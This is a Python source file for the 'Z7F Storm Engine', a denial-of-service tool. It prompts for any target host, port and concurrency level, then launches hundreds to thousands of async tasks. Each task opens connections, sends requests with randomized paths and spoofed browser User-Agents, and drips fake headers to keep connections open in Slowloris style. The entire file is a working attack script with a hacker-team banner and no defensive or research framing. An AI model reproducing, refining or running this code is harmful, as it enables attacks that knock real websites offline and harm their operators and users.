import asyncio
import random
import os
import sys
import time
import socket
from datetime import datetime

# الألوان الاحترافية
R, G, Y, B, C, W = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;36m', '\033[1;37m'

def logo():
    os.system('clear')
    print(f"""
{R}  _______ ______ ______        {W}  _____ _______ ____  _____  __  __ 
{R} |__   __|____  |  ____|      {W} / ____|__   __/ __ \|  __ \|  \/  |
{R}    | |     / /| |__         {W}| (___    | | | |  | | |__) | \  / |
{R}    | |    / / |  __|         {W}\___ \   | | | |  | |  _  /| |\/| |
{R}    | |   / /  | |            {W}____) |  | | | |__| | | \ \| |  | |
{R}    |_|  /_/   |_| {W}Z7F        {R}|_____/   |_|  \____/|_|  \_\_|  |_|
{C}=====================================================================
{Y}        Z7F STORM ENGINE V7.0 | ASYNC MULTI-VECTOR ATTACK
{G}        POWERED BY: Z7F TEAM | STATUS: EXTREME OVERLOAD
{C}====================================================================={W}""")

class Z7F_Storm:
    def __init__(self, target, port, power):
        self.target = target
        self.port = port
        self.power = power
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
        ]
        self.attack_count = 0

    async def build_packet(self):
        """بناء حزمة بيانات احترافية لمحاكاة متصفح حقيقي"""
        path = "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=10))
        header = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"User-Agent: {random.choice(self.user_agents)}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.5\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\n"
            f"Connection: keep-alive\r\n"
            f"Upgrade-Insecure-Requests: 1\r\n"
            f"Cache-Control: no-cache\r\n\r\n"
        ).encode('utf-8')
        return header

    async def launch_strike(self):
        """إطلاق ضربة واحدة باستخدام Non-blocking Socket"""
        while True:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target, self.port), timeout=3
                )
                packet = await self.build_packet()
                writer.write(packet)
                await writer.drain()
                
                # إبقاء الاتصال مفتوح لاستنزاف السيرفر (Slowloris technique)
                for _ in range(10):
                    await asyncio.sleep(0.1)
                    writer.write(f"X-Z7F-{random.randint(1, 999)}: {random.random()}\r\n".encode())
                    await writer.drain()
                    self.attack_count += 1
                
                writer.close()
                await writer.wait_closed()
            except:
                await asyncio.sleep(0.05) # إعادة المحاولة بسرعة

    async def monitor(self):
        """مراقب الأداء الحي"""
        while True:
            await asyncio.sleep(1)
            print(f"{G}[STORM STATUS]{W} Total Requests Sent: {Y}{self.attack_count}{W} | Engines: {C}Active{W}")

async def main():
    logo()
    try:
        url = input(f"{G}Target (google.com): {W}").replace('http://','').replace('https://','').split('/')[0]
        ip = socket.gethostbyname(url)
        print(f"{C}[+] Resolved IP: {W}{ip}")
        
        port = int(input(f"{G}Port (80/443): {W}") or 80)
        power = int(input(f"{G}Attack Power (Try 1000-2000): {W}") or 1000)
        
        storm = Z7F_Storm(url, port, power)
        
        print(f"\n{R}[!!!] STORM STARTED - MAX POWER ENABLED [!!!]{W}")
        
        # تشغيل المحركات والمراقب بالتزامن
        tasks = [storm.launch_strike() for _ in range(power)]
        tasks.append(storm.monitor())
        
        await asyncio.gather(*tasks)
        
    except Exception as e:
        print(f"{R}[-] Fatal Error: {e}{W}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Storm Stopped By User.{W}")
